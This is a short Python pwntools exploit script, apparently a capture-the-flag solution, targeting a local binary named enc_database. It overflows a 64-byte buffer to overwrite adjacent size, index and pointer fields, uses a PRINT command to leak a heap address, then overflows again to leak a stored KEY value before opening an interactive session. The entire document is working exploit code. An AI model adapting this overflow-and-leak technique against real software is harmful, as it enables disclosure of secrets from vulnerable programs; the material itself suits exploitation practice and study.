#!/usr/bin/env python3

from pwn import *

target = process("../bin/enc_database")

key_addr = subprocess.check_output(["objdump -d ../bin/enc_database | grep '<KEY>'"], shell=True).split()
key_addr = key_addr[key_addr.index(b"#") + 1]
key_addr = int(key_addr, 16)
print(f"EXTRACTED KEY_ADDR: {hex(key_addr)}")


payload = b"a" * 16 # cmd
payload += b"b" * 64 # buf
payload += p64(64) # size
payload += p64(0x004040d8) # curr_idx
payload += p64(100) # actions
payload += p64(key_addr) # it

target.sendlineafter(b"> ", payload)
target.sendlineafter(b"> ", b"PRINT")
leak = target.recvline()[:-1].split()[1] # heap leak
leak = leak + (8 - len(leak)) * b"\x00"

print(f"HEAP LEAK: {hex(u64(leak))}")

payload = b"a" * 16 # cmd
payload += b"b" * 64 # buf
payload += p64(64) # size
payload += p64(0x004040d8) # curr_idx
payload += p64(100) # actions
payload += leak # it

target.sendlineafter(b"> ", payload)
target.sendlineafter(b"> ", b"PRINT")

leak = target.recvline().split()[1] # KEY leak!
print(f"KEY LEAKED: {leak}")

target.interactive()
